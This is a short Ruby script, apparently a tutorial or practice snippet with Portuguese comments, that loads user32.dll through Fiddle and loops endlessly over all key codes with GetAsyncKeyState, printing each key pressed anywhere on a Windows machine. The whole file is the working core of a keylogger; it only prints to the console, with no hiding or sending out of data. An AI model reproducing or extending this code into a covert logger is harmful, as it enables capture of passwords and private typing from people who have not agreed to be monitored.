require 'fiddle/import'
 
module Key
    extend Fiddle::Importer
    dlload("user32.dll")
    extern("short GetAsyncKeyState(int)")
end
 
loop do 
    (0..255).each do |code|
          state = Key.GetAsyncKeyState(code)#Retiramos o key do if para dentro de uma variável
          if state != 0 and state & 0x01 == 1 #Criamos uma condição para que ele não se repita
               puts("Pressionado : #{code.chr}")
          end
    end
end
